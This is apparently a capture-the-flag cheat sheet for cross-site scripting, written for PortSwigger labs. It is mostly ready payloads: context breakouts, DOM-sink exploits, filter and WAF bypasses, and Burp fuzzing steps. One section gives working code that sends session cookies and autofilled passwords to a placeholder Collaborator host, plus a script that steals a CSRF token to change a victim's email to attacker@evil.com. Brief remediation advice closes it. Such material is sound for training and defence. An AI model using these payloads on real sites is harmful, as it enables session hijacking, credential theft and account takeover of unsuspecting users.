# Cross-Site Scripting (XSS) — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, browser DevTools, Burp Collaborator  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

When hunting for XSS in CTFs and Web Security Academy labs:

1. **Identify Sources:** Locate user-controlled inputs (URL parameters, search bars, form inputs, fragment identifiers `#`, HTTP headers, cookies).
2. **Determine Reflection / Sink Type:**
   - **Reflected:** Input immediately echoed in HTTP response.
   - **Stored:** Input saved on server (comments, profiles, reviews) and rendered to other users.
   - **DOM-based:** Input processed by client-side JavaScript (`document.write`, `innerHTML`, `eval`, jQuery `$()`) without server roundtrip.
3. **Analyze Context:** Inspect where input lands:
   - Inside HTML body: `<div>USER_INPUT</div>`
   - Inside HTML attribute: `<input value="USER_INPUT">`
   - Inside `href` / URL attribute: `<a href="USER_INPUT">`
   - Inside `<script>` string: `var term = 'USER_INPUT';`
   - Inside template literal: `var msg = `Hello ${USER_INPUT}`;`
4. **Probe Character Handling:** Test special characters: `< > ' " \ ; / () { } \` to see what is encoded, stripped, or escaped.
5. **Bypass Filters / WAFs:** Adapt payload based on blocked tags, forbidden attributes, or character filters.
6. **Weaponize Impact:** Escalate execution to cookie theft, credential harvesting via password managers, or state-changing CSRF chaining.

---

## 2. Context-Based Injection

### Context A: HTML Body Context (`<div>...</div>`)

When `<` and `>` are **not** encoded:

```html
<!-- Direct script injection -->
<script>alert(1)</script>

<!-- Event handler with invalid image source -->
<img src=x onerror=alert(1)>

<!-- Auto-triggering vector without user interaction -->
<svg onload=alert(1)>
```

---

### Context B: HTML Attribute Context (`<input value="...">`)

When `<` and `>` are encoded, break out using quotes and event handlers:

```html
<!-- Break out of double quotes -->
" onfocus="alert(1)" autofocus="
" onmouseover="alert(1)" x="

<!-- Break out of single quotes -->
' onfocus='alert(1)' autofocus='

<!-- If quotes are stripped/encoded, look for unquoted attributes -->
x onfocus=alert(1) autofocus
```

---

### Context C: `href` and URL Context (`<a href="...">`)

When input is reflected inside an anchor `href` or `iframe` `src`:

```html
<!-- JavaScript pseudo-protocol (works even if quotes/tags are encoded) -->
javascript:alert(1)
javascript:fetch('https://COLLAB/?c='+encodeURIComponent(document.cookie))
```

---

### Context D: JavaScript String Literal Context

Input reflected inside `<script>var query = 'USER_INPUT';</script>`:

#### 1. Terminate the Script Tag
If `<` and `>` are allowed:
```html
</script><script>alert(1)</script>
```

#### 2. Break Out of the String Variable
If `<>` are encoded, but quotes are not:
```javascript
'-alert(1)-'
';alert(1)//
```

#### 3. Single Quote Escaped with Backslash (`\'`)
If the server adds a backslash before single quotes (`' ` → `\'`):
Inject a backslash to escape the server's backslash (`\` → `\\'`), freeing your quote:
```javascript
\'-alert(1)//
```
*Backend renders:* `'\\'-alert(1)//'` (Valid syntax).

#### 4. JSON Context Inside Script
When reflected inside `JSON.parse()` or dynamically generated JSON:
```javascript
\"-alert(1)}//
```

---

### Context E: JavaScript Template Literals (`` `...` ``)

Input reflected inside backticks: `var name = `Welcome ${USER_INPUT}`;`:
```javascript
${alert(1)}
```
*Executes without needing quotes, angle brackets, or semicolons.*

---

## 3. DOM-Based Sinks & Sources

### Common DOM Sources
- `location.search` (`window.location.search`)
- `location.hash` (`window.location.hash`)
- `location.pathname`
- `document.referrer`
- `window.name`

---

### Sinks & Exploitation Patterns

| Sink | Vulnerable Pattern | Exploit Payload |
|---|---|---|
| `document.write()` | `document.write('<img src="' + query + '">')` | `"><script>alert(1)</script>` |
| `element.innerHTML` | `element.innerHTML = query` | `<img src=x onerror=alert(1)>` *(Note: `<script>` tags will NOT execute in innerHTML)* |
| `element.href` | `element.href = query` | `javascript:alert(1)` |
| `jQuery $()` | `$(location.hash)` | Deliver via iframe: `<iframe src="target#<img src=x onerror=alert(1)>">` |
| AngularJS expression | `ng-app` active on page | `{{$on.constructor('alert(1)')()}}` |

---

## 4. Filter & WAF Bypasses

### 1. Most Tags Blocked (Allowing Custom Tags)
When standard HTML tags (`<script>`, `<img>`, `<svg>`, `<iframe>`) are blocked:

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```
*Exploit delivery via iframe:*
```html
<iframe src="https://TARGET/?search=%3Cxss+id%3Dx+onfocus%3Dalert(document.cookie)+tabindex%3D1%3E#x"></iframe>
```

---

### 2. Standard Event Handlers Blocked (Using SVG Animations)
When `onerror`, `onload`, `onclick`, `onmouseover` are blacklisted:

```html
<!-- SVG animateTransform -->
<svg><animatetransform onbegin=alert(1)>

<!-- SVG animate -->
<svg><animate onbegin=alert(1)>

<!-- SVG embedded anchor tag -->
<svg><a><rect width="100%" height="100%"></rect><text y="20">Click</text></a></svg>
```

---

### 3. Canonical Link Tag Reflection
When reflection occurs inside `<link rel="canonical" href="USER_INPUT">`:
Inject access keys and user interaction handlers:
```html
?'accesskey='x'onclick='alert(1)
```
*Trigger:* User presses `Alt+Shift+X` (Chrome Windows) or `Cmd+Alt+X` (Mac).

---

### 4. Restricted Characters in JavaScript URL
When parentheses `()` or spaces are blocked:

```javascript
// Throw onerror trick (no parentheses)
throw onerror=alert,'1'

// Location redirect
location='javascript:alert\x281\x29'
```

---

### 5. XML / Template Encoding Bypass
When input is inside XML/SVG markup:
Use HTML/XML numerical entities that are decoded before execution:
```html
<svg><a xlink:href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)"><text y="20">Click</text></a></svg>
```

---

## 5. Weaponization: Stealing Data & Account Takeover

### 1. Stealing Session Cookies (Non-HttpOnly)

Deliver via stored XSS or reflected link to forward session token to Burp Collaborator:

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>
```

*Shorthand GET exfiltration:*
```html
<img src=x onerror="this.src='https://BURP-COLLABORATOR-SUBDOMAIN/?c='+encodeURIComponent(document.cookie)">
```

---

### 2. Stealing Passwords via Autofill Harvesting

Browser password managers automatically fill stored credentials into `<input type="password">` fields:

```html
<input name=username id=username>
<input type=password name=password id=password onchange="
  if (this.value.length) {
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
      method: 'POST',
      mode: 'no-cors',
      body: username.value + ':' + this.value
    });
  }
">
```

---

### 3. Bypassing CSRF Tokens via In-Session Requests

Read the current user's CSRF token from the DOM and submit a privileged state change:

```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    var token = this.responseXML.getElementsByName('csrf')[0].value;
    var post = new XMLHttpRequest();
    post.open('POST', '/my-account/change-email', true);
    post.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    post.send('csrf=' + token + '&email=attacker@evil.com');
};
req.open('GET', '/my-account', true);
req.responseType = 'document';
req.send();
</script>
```

---

## 6. Burp Suite Automation & Fuzzing

### Fuzzing Allowed Tags with Intruder

1. Intercept search/input request and send to **Intruder**.
2. Set payload marker: `<§tag§>`.
3. Load PortSwigger / SecLists HTML tag list into **Payloads**.
4. Start attack and sort by status code / response length:
   - Status 200 = **Allowed tag**.
   - Status 400 / 403 = **Blocked tag**.

### Fuzzing Allowed Attributes / Events

1. Set payload marker: `<ALLOWED_TAG §attribute§=1>`.
2. Load event handler list (`onerror`, `onload`, `onfocus`, `onbegin`, `onresize`, etc.).
3. Identify allowed event handlers from status 200 responses.

---

## 7. CTF Quick Reference

| Reflection Context | Defense / Filter | Payload Pattern |
|---|---|---|
| **HTML Body** | None | `<script>alert(1)</script>` |
| **HTML Body** | `innerHTML` Sink | `<img src=x onerror=alert(1)>` |
| **HTML Body** | All tags blocked except custom | `<xss id=x onfocus=alert(1) tabindex=1>#x` |
| **HTML Body** | Standard tags blocked | `<svg><animatetransform onbegin=alert(1)>` |
| **Attribute** | `<>` encoded | `" onfocus="alert(1)" autofocus="` |
| **Anchor Href** | Quotes encoded | `javascript:alert(1)` |
| **Script String** | `<>` encoded, quotes open | `'-alert(1)-'` or `';alert(1)//` |
| **Script String** | Quotes escaped `\'` | `\'-alert(1)//` |
| **Script String** | Quotes & backslash blocked | `</script><script>alert(1)</script>` |
| **Template Literal**| Backticks active | `${alert(1)}` |
| **AngularJS** | `ng-app` active | `{{$on.constructor('alert(1)')()}}` |
| **Canonical Link** | Reflected in `<link>` | `?'accesskey='x'onclick='alert(1)` |

---

## 8. Remediation & Best Practices

1. **Context-Aware Output Encoding:**
   - HTML body: HTML Entity encode (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`).
   - JavaScript context: Unicode-escape non-alphanumeric characters (`\uXXXX`).
2. **Safe DOM Sinks:**
   - Use `element.textContent` instead of `element.innerHTML`.
   - Sanitize HTML before inserting via trusted libraries (e.g. `DOMPurify.sanitize()`).
3. **Cookie Hardening:**
   - Set `HttpOnly` flag on all session cookies to prevent theft via JavaScript.
4. **Content Security Policy (CSP):**
   - Enforce strict CSP with nonces or hashes, disabling `unsafe-inline` and `unsafe-eval`:
     ```http
     Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m';
     ```
